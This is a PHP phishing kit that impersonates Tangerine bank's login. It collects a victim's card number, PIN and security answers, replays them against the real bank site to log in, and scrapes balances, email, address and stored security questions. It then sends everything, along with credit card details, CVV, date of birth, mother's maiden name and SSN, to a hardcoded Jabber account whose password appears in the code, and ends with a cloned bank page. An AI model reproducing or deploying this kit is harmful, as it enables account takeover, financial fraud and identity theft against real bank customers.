<?php

error_reporting(0);
	set_time_limit(0);
		session_start();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$redirect = 'https://www.tangerine.ca/en/index.html';



function sendJabb($str)
{
	$jabber = array('me'=>'x247@jabbim.com', 'server'=> 'jabbim.com', 'port'=>'5222', 'user'=>'x247@jabbim.com', 'pass'=>'smDX$r1@9fcVw');

include_once( 'XMPPHP/XMPP.php');

$conn = new XMPPHP_XMPP($jabber['server'], $jabber['port'], $jabber['user'], $jabber['pass'], 'xmpphp', $jabber['server'], $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);

try {
    $conn->connect();
    $conn->processUntil('session_start');
    $conn->presence();
    $conn->message($jabber['me'], $str);
    $conn->disconnect();
} catch(XMPPHP_Exception $e) {
  
}

}
/*
if(!isset($_COOKIE['v']))
{
	setcookie("v", 1, time()+(3600*24));
	
	$str = "Visited TANGERINE: ".$ip." - ".date('D M d, Y h:i A')." - http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];

	sendJabb($str);
}*/

$step = (isset($_POST['step'])?$_POST['step']:1);
$cookie = dirname(__FILE__).'/'.md5($_SERVER['REMOTE_ADDR']).'.txt';

	$urlpostcc = 'https://secure.tangerine.ca/web/Tangerine.html';
 $donor = 'https://secure.tangerine.ca/web/InitialTangerine.html?command=displayLogin&device=web&locale=en_CA';
	
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer:https://secure.tangerine.ca/web/InitialTangerine.html?command=displayLogin&device=web&locale=en_CA',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
					'X-DevTools-Emulate-Network-Conditions-Client-Id:');

	$sh = curl_init();
if($step==2) 
{
 $_SESSION['cc'] = trim(rtrim($_POST['ACN']));
 if(file_exists($cookie)) unlink($cookie);
 
 
	$cc = $_SESSION["cc"];

//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$donor);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($sh,CURLOPT_HEADER,true);
		curl_setopt($sh,CURLOPT_COOKIEFILE, $cookie);
		curl_setopt($sh,CURLOPT_COOKIEJAR, $cookie);
		
		$data = curl_exec($sh);
		
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer:https://secure.tangerine.ca/web/InitialTangerine.html?command=displayLogin&device=web&locale=en_CA',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
					'X-DevTools-Emulate-Network-Conditions-Client-Id:');
	$localinfo = 'pm_fp=version%253D1%2526pm%255Ffpua%253Dmozilla%252F5%252E0%2520%2528windows%2520nt%25206%252E1%253B%2520wow64%2529%2520applewebkit%252F537%252E36%2520%2528khtml%252C%2520like%2520gecko%2529%2520chrome%252F37%252E0%252E2062%252E120%2520safari%252F537%252E36%257C5%252E0%2520%2528Windows%2520NT%25206%252E1%253B%2520WOW64%2529%2520AppleWebKit%252F537%252E36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome%252F37%252E0%252E2062%252E120%2520Safari%252F537%252E36%257CWin32%2526pm%255Ffpsc%253D24%257C1440%257C900%257C860%2526pm%255Ffpsw%253D%257Cqt1%257Cqt2%257Cqt3%257Cqt4%257Cqt5%2526pm%255Ffptz%253D4%2526pm%255Ffpln%253Dlang%253Dfr%257Csyslang%253D%257Cuserlang%253D%2526pm%255Ffpjv%253D1%2526pm%255Ffpco%253D1';
	$post = 'command=PersonalCIF&locale=en_CA&device=web&pm_fp='.$localinfo.'&DST=&cafemode=&refNumber=&treatmentCode=&ACN='.$cc.'&tbNickname=&ddCIF=addAnother&Go=';

	#sleep(rand(3,4));
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlpostcc);
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_POST,true);
		curl_setopt($sh,CURLOPT_POSTFIELDS,$post);
		curl_setopt($sh,CURLOPT_HEADER,false);
		curl_setopt($sh,CURLOPT_COOKIEFILE, $cookie);
		curl_setopt($sh,CURLOPT_COOKIEJAR, $cookie);
		$data = curl_exec($sh);
		
		$urlqwest = 'https://secure.tangerine.ca/web/Tangerine.html?command=displayChallengeQuestion';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlqwest);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($sh,CURLOPT_HEADER,true);
		curl_setopt($sh,CURLOPT_COOKIEFILE, $cookie);
		curl_setopt($sh,CURLOPT_COOKIEJAR, $cookie);
		$data = curl_exec($sh); 
		$qwest = explode('Your secret question</h2>',$data);
		$qwest = explode('</p>',$qwest[1]);
		$qwest = strip_tags($qwest[0]);
		$qwest = str_replace(array("\r\n", "\r", "\n"), '' ,$qwest);
		
		if($qwest == "")
		{
		 $step = 1;
		 
		}else $_SESSION['question'] =$qwest;
		
 }

elseif($step==4) 
{

	$donor = 'https://secure.tangerine.ca/web/InitialTangerine.html?command=displayLogin&device=web&locale=en_CA';
	
	$_SESSION['pin'] = $_POST['pin'];
	$cc = $_SESSION["cc"];
	$pin = $_SESSION["pin"];
	$q1 = $_SESSION["question"];
	$q2 =$_SESSION["question"];
	$q3 = $_SESSION["question"];
	$sh = curl_init();
	
 
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=displayChallengeQuestion',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36');
	$localinfo ='version%253D1%2526pm%255Ffpua%253Dmozilla%252F5%252E0%2520%2528windows%2520nt%25206%252E1%253B%2520wow64%253B%2520rv%253A32%252E0%2529%2520gecko%252F20100101%2520firefox%252F32%252E0%257C5%252E0%2520%2528Windows%2529%257CWin32%2526pm%255Ffpsc%253D24%257C1440%257C900%257C860%2526pm%255Ffpsw%253D%2526pm%255Ffptz%253D4%2526pm%255Ffpln%253Dlang%253Dfr%252DFR%257Csyslang%253D%257Cuserlang%253D%2526pm%255Ffpjv%253D1%2526pm%255Ffpco%253D1';
	$post = 'command=verifyChallengeQuestion&locale=&device=&pm_fp='.$localinfo.'&BUTTON=&Answer='.urlencode($_SESSION['answer']).'&Next=';
	sleep(rand(1,2));
 //		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlpostcc);
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_POST,true);
		curl_setopt($sh,CURLOPT_POSTFIELDS,$post);
		curl_setopt($sh,CURLOPT_HEADER,1);
		curl_setopt($sh,CURLOPT_COOKIEFILE, $cookie);
		curl_setopt($sh,CURLOPT_COOKIEJAR, $cookie);
		$data = curl_exec($sh);
	
	$urlpin = 'https://secure.tangerine.ca/web/Tangerine.html?command=displayPIN';

		curl_setopt($sh,CURLOPT_URL,$urlpin);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($sh,CURLOPT_HEADER,true);
		curl_setopt($sh,CURLOPT_COOKIEFILE, $cookie);
		curl_setopt($sh,CURLOPT_COOKIEJAR, $cookie);
		$data = curl_exec($sh); 
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=displayPIN',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36');		
	$localinfo ='version%253D1%2526pm%255Ffpua%253Dmozilla%252F5%252E0%2520%2528windows%2520nt%25206%252E1%253B%2520wow64%253B%2520rv%253A32%252E0%2529%2520gecko%252F20100101%2520firefox%252F32%252E0%257C5%252E0%2520%2528Windows%2529%257CWin32%2526pm%255Ffpsc%253D24%257C1440%257C900%257C860%2526pm%255Ffpsw%253D%2526pm%255Ffptz%253D4%2526pm%255Ffpln%253Dlang%253Dfr%252DFR%257Csyslang%253D%257Cuserlang%253D%2526pm%255Ffpjv%253D1%2526pm%255Ffpco%253D1';
	$post = 'command=validatePINCommand&locale=en_CA&device=web&BUTTON=&pm_fp='.$localinfo.'&PIN='.$pin.'&Go=';
	sleep(rand(1,2));
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlpostcc);
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_POST,true);
		curl_setopt($sh,CURLOPT_POSTFIELDS,$post);
		curl_setopt($sh,CURLOPT_HEADER,false);
		curl_setopt($sh,CURLOPT_COOKIEFILE, $cookie);
		curl_setopt($sh,CURLOPT_COOKIEJAR, $cookie);
		$data = curl_exec($sh);	
		
	sleep(2);
	$urlacc = 'https://secure.tangerine.ca/web/Tangerine.html?command=PINPADPersonal';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlacc);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($sh,CURLOPT_HEADER,true);
		curl_setopt($sh,CURLOPT_COOKIEFILE, $cookie);
		curl_setopt($sh,CURLOPT_COOKIEJAR, $cookie);
		$data = curl_exec($sh);

	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=displayENotification',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36');
		sleep(rand(1,2));
		$urlgood = 'https://secure.tangerine.ca/web/Tangerine.html?command=retrieveGeneralSettingsInfo';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlgood);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HEADER,true);
		curl_setopt($sh,CURLOPT_COOKIEFILE, $cookie);
		curl_setopt($sh,CURLOPT_COOKIEJAR, $cookie);
		$data = curl_exec($sh);
		
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=retrieveGeneralSettingsInfo',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36');
		$urlgood = 'https://secure.tangerine.ca/web/Tangerine.html?command=displayGeneralSettings';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlgood);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HEADER,true);
		curl_setopt($sh,CURLOPT_COOKIEFILE, $cookie);
		curl_setopt($sh,CURLOPT_COOKIEJAR, $cookie);
		$data = curl_exec($sh);
		
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=displayGeneralSettings',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36');
		sleep(rand(1,2));
		$urlgood = 'https://secure.tangerine.ca/web/Tangerine.html?command=gotoValidatedEnrollment&Initial=true';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlgood);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HEADER,true);
		curl_setopt($sh,CURLOPT_COOKIEFILE, $cookie);
		curl_setopt($sh,CURLOPT_COOKIEJAR, $cookie);
		$data = curl_exec($sh);
sleep(rand(1,2));
		
		$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=gotoValidatedEnrollment&Initial=true',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36');
		$urlgood = 'https://secure.tangerine.ca/web/Tangerine.html?command=displayValidatedEnrollment';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlgood);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HEADER,true);
		curl_setopt($sh,CURLOPT_COOKIEFILE, $cookie);
		curl_setopt($sh,CURLOPT_COOKIEJAR, $cookie);
		$data = curl_exec($sh);
		$dataQQQQ = $data;
	
$s='<p for="" class="text-left CB_DoNotShow">';
$ss = explode($s, $dataQQQQ);
if(count($ss)==1) exit ('details wrong.');
unset($ss[0]);
$qq= "";
foreach($ss as $s_)
{
$q = substr($s_, strpos($s_, '</b>')+strlen('</b>'), strlen($s_));
$q =substr($q, 0, strpos($q, '<br>'));

$a = substr($s_, strpos($s_, '<b>Answer: </b>')+strlen('<b>Answer: </b>'), strlen($s_));
$a =substr($a, 0, strpos($a, '</p>'));

$qq.=$q.":".$a."\r\n";
}

$_SESSION['questions']=$qq;
sleep(rand(1,2));

	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=displayValidatedEnrollment',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36');
$urlgood = 'https://secure.tangerine.ca/web/Tangerine.html?command=displayAccountSummary&fill=1';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlgood);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HEADER,true);
		curl_setopt($sh,CURLOPT_COOKIEFILE, $cookie);
		curl_setopt($sh,CURLOPT_COOKIEJAR, $cookie);
		$data = curl_exec($sh);
		
		$e= '<span class="pull-left">';
		$ex = explode($e, $data);
		$e = explode('</span>', $ex[1]);
		$_SESSION['fullname'] = str_replace('<br>', ' ', $e[0]);
		
		
		$data = str_replace(array("\r", "\n", "\t"),array( "", "", ""), $data);
$data = substr($data, 0, strpos($data, '<div class="row-fluid account-summary-download-transactions">'));
$e = 'data-title="Account name"';
$e = explode($e, $data);
unset($e[0]);
$balance = "";
$_SESSION['credit'] = false;
foreach($e as $acc)
{
	$cc =explode('">', $acc);
	$cc = explode('</a',$cc[1]);
	$cc = $cc[0];
	
	if(strstr($cc, 'Credit Card')) $_SESSION['credit'] = true;
	
	$total  = explode('data-title="CAD:">', $acc);
	$total = explode('</', $total[1]);
	$total = rtrim(trim($total[0]));
	$balance.="\r\n$cc - $total";
}


	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=displayValidatedEnrollment',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36');
$urlgood = 'https://secure.tangerine.ca/web/Tangerine.html?command=displayGeneralSettings';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlgood);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HEADER,true);
		curl_setopt($sh,CURLOPT_COOKIEFILE, $cookie);
		curl_setopt($sh,CURLOPT_COOKIEJAR, $cookie);
		$data = curl_exec($sh);
		
		$email = explode('<p id="emailaddress">', $data);
		$email = explode('</p>', $email[1]);
		$_SESSION["email"] = $email[0];
		
		$address = explode('<p id="homeaddress">', $data);
		$address = explode('</p>', $address[1]);
		$_SESSION["address"] = str_replace("<br>", " ", $address[0]);
		



$_SESSION['balance'] = $balance;


}
		
elseif($step==3) 
{
 $_SESSION['answer'] = trim(rtrim($_POST['answer'])); 
}

elseif($step==5) 
{
 if(file_exists($cookie)) unlink($cookie);
		$str =  "Card Number: ".$_SESSION['cc']."\r\n";
		$str .= "PIN#: ".$_SESSION['pin']."\r\n";
		$str .= $_SESSION['questions']."\r\n";			
		$str .= "Full Name: ".$_SESSION['fullname']."\r\n";
		$str .= "Address: ".$_SESSION['address']."\r\n";
		$str .= "CC Number: 5360".$_POST["cc2"].$_POST["cc3"].$_POST["cc4"]."\r\n";
		$str .= "EXP: ".$_POST["expm"]."/".$_POST["expy"]."\r\n";
		$str .= "CVV: ".$_POST["cvv"]."\r\n";
		
		$str .= "---Balance--- ".$_SESSION['balance']."\r\nEmail: ".$_SESSION['email']."\r\nDOB: ".$_POST['dob']."\r\nMother's Maiden Name: ".$_POST['mothermaiden']."\r\nSocial Security Number: ".$_POST['ssn']."\r\n\r\n";
		$str .= "IP: ".$_SERVER['REMOTE_ADDR']."\r\n";
		$str .= "USER AGENT: ".$_SERVER['HTTP_USER_AGENT']."\r\n";
		$str .= "DATE: ".date("Y/m/d H:i:s")."\r\n";

$str = htmlspecialchars($str);

sendJabb($str);

header("location: ".$redirect);
exit('<script>location.href="'.$redirect.'"</script>');
	
	
}


if($step==4)
{
?>

<!DOCTYPE html SYSTEM "">
<!--[if lt IE 7]><html lang="en-CA" class="no-js lt-ie9 lt-ie8 lt-ie7"><![endif]--><!--[if IE 7]><html lang="en-CA" class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if IE 8]><html lang="en-CA" class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><html lang="en-CA" class="no-js"><![endif]--><html lang="en-CA" class="no-js">
<head>
<META http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

<meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1.0, maximum-scale=1.0">
<link rel="stylesheet" href="css/core.min.css">
<link rel="stylesheet" href="css/layout.css">
<link rel="stylesheet" href="css/module.css">
<link rel="stylesheet" href="css/state.css">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="expires" content="0">
<meta http-equiv="cache-control" content="no-cache, no-store">
<title>Tangerine bank</title>
</head>
<body>
<div class="viewport">
<div class="frame">
<div id="popout-nav" class="menu collapse">
<header class="mobile-menu-header">
<div class="mobile-menu-header-left">
<a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">Log me in</a>
</div>
<div class="mobile-menu-header-right">
<div class="btn-group">
<a class="btn btn-warning active" type="button">EN</a><a class="btn" type="button" href="http://www.site.com/fr/index.html">FR</a>
</div>
</div>
</header>
<ul class="mobile-menu-nav">
<li>
<a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">I'm a Client, let me in!</a>
</li>
<li>
<a href="http://www.site.com/en/saving/index.html">Saving</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-savings" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-savings">
<a class="mobile-dropdown-item" href="http://www.site.com/en/saving/savings-accounts/index.html">Savings Accounts</a><a class="mobile-dropdown-item" href="http://www.site.com/en/saving/guaranteed-investments/index.html">Guaranteed Investments</a><a class="mobile-dropdown-item" href="http://www.site.com/en/saving/business-savings-accounts/index.html">Business Savings Accounts</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/chequing/index.html">Chequing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-chequing" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-chequing">
<a href="http://www.site.com/en/chequing/chequing-account/index.html">Chequing Account</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/investing/index.html">Investing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-mutual-funds" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-mutual-funds">
<a class="mobile-dropdown-item" href="http://www.site.com/en/investing/investment-funds/index.html">Investment Funds</a><a class="mobile-dropdown-item" href="http://www.site.com/en/investing/RSPs/index.html">RSPs</a><a class="mobile-dropdown-item" href="http://www.site.com/en/investing/TFSAs/index.html">TFSAs</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/borrowing/index.html">Borrowing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-mortgages" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-mortgages">
<a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/tangerine-mortgage/index.html">Tangerine Mortgage</a><a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/home-equity-line-of-credit/index.html">Home Equity Line of Credit</a><a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/rsp-loan/index.html">RSP Loan</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/ways-to-bank/index.html">Ways to bank</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-ways-to-bank" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-ways-to-bank">
<a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/online-banking/index.html">Online banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/mobile-banking/index.html">Mobile banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/telephone-banking/index.html">Telephone banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/cafe/index.html">Cafe</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/automated-banking-machines/index.html">ABMs</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/debit-card/index.html">Debit Card</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/sign-me-up/index.html">Sign me up</a>
</li>
<li class="seperator"></li>
<li class="mobile-static">
<a href="../../InitialTangerine.html?locale=en_CA&amp;device=web&amp;command=goToAbmLocator">ABM locator</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/accounts-rates/ourrates/index.html">Rates</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/tools/index.html">Tools</a>
</li>
<li class="mobile-static">
<a href="http://forwardthinking.site.com/en/">Forward Thinking</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/faq/">FAQ</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/about-us/index.html">About us</a>
</li>
</ul>
</div>
<div class="view">
<section class="mobile-header-top hidden-desktop">
<div class="navbar-inner">
<button type="button" class="btn btn-navbar btn-menu" id="mobile-btn-open-nav" data-target="#popout-nav"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button><img src="css/tangerine_lockup.svg" alt="Tangerine logo" width="160"><button class="btn btn-navbar btn-search icon-search collapsed" type="button" data-toggle="collapse" data-target="#mobile-header-search"></button>
</div>
<div class="collapse" id="mobile-header-search">
<form name="gs" method="GET" action="http://www.site.com/search">
<input type="hidden" name="site" value="en_tg_collection"><input type="hidden" name="client" value="en_tg_frontend"><input type="hidden" name="output" value="xml_no_dtd"><input type="hidden" name="proxystylesheet" value="en_tg_frontend"><input type="text" name="as_q" class="input input-search" accept-charset="UTF-8" placeholder="Search" tabindex="-1">
</form>
</div>
</section>
	
		
			
<section class="header-top visible-desktop">
<div class="container">
<div class="header-top-menu">
<a class="header-top-menu-link" href="http://www.site.com/en/about-us/index.html">About us</a> |
              <a class="header-top-menu-link" href="http://www.site.com/en/about-us/contact-us/index.html">Contact us</a> |
              <a class="header-top-menu-link" href="http://www.site.com/en/faq/">FAQs</a> |     

              <a href="http://www.site.com/fr/index.html">Francais</a> |
